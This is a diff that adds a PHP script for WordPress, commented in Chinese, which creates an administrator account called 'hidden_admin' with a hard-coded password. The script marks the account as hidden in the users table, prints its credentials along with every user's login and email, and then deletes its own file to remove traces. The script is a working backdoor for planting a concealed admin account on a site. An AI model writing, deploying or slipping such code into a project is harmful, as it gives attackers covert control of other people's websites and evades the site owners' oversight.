@@ -1,0 +1,72 @@
+header("Content-Type: text/html; charset=utf-8");
+
+// 加载 WordPress 环境
+require_once __DIR__ . '/wp-load.php';
+
+// 配置新管理员信息
+$new_user = [
+    'user_login'    => 'hidden_admin', // 自定义用户名
+    'user_pass'     => 'StrongPassword123!', // 自定义密码
+    'user_email'    => 'hidden_admin@example.com', // 自定义邮箱
+    'display_name'  => 'Hidden Admin', // 显示名称
+    'role'          => 'administrator'
+];
+
+global $wpdb;
+
+// 检查用户是否已经存在
+if (username_exists($new_user['user_login']) || email_exists($new_user['user_email'])) {
+    die("用户 {$new_user['user_login']} 或邮箱 {$new_user['user_email']} 已存在！");
+}
+
+// 创建新用户
+$user_id = wp_create_user($new_user['user_login'], $new_user['user_pass'], $new_user['user_email']);
+if (is_wp_error($user_id)) {
+    die("创建用户失败：" . $user_id->get_error_message());
+}
+
+// 设置用户为管理员角色
+$user = new WP_User($user_id);
+$user->set_role('administrator');
+
+// 隐藏用户：通过修改数据库表 `users` 中 `user_status` 字段
+$wpdb->update(
+    $wpdb->users,
+    ['user_status' => 1], // 将用户状态设为 1（隐藏用途）
+    ['ID' => $user_id]
+);
+
+// 输出新用户信息
+echo "<h3>隐藏管理员用户已创建：</h3>";
+echo "用户名：{$new_user['user_login']}<br>";
+echo "密码：{$new_user['user_pass']}<br>";
+echo "邮箱：{$new_user['user_email']}<br><br>";
+
+// 列出所有用户及其信息（明文密码仅对新用户显示）
+echo "<h3>当前站点所有用户：</h3>";
+$users = $wpdb->get_results("SELECT ID, user_login, user_email FROM {$wpdb->users}");
+
+echo "<table border='1' cellpadding='5' cellspacing='0'>";
+echo "<tr><th>ID</th><th>用户名</th><th>邮箱</th><th>密码</th></tr>";
+foreach ($users as $user) {
+    echo "<tr>";
+    echo "<td>{$user->ID}</td>";
+    echo "<td>{$user->user_login}</td>";
+    echo "<td>{$user->user_email}</td>";
+    if ($user->ID == $user_id) {
+        echo "<td>{$new_user['user_pass']}</td>"; // 显示新用户的明文密码
+    } else {
+        echo "<td>********</td>"; // 其他用户密码隐藏
+    }
+    echo "</tr>";
+}
+echo "</table>";
+
+// 自动删除脚本自身
+$current_file = __FILE__;
+if (unlink($current_file)) {
+    echo "<p style='color:green;'>脚本已成功运行并删除自身！</p>";
+} else {
+    echo "<p style='color:red;'>无法删除脚本，请手动删除文件：{$current_file}</p>";
+}
+?>
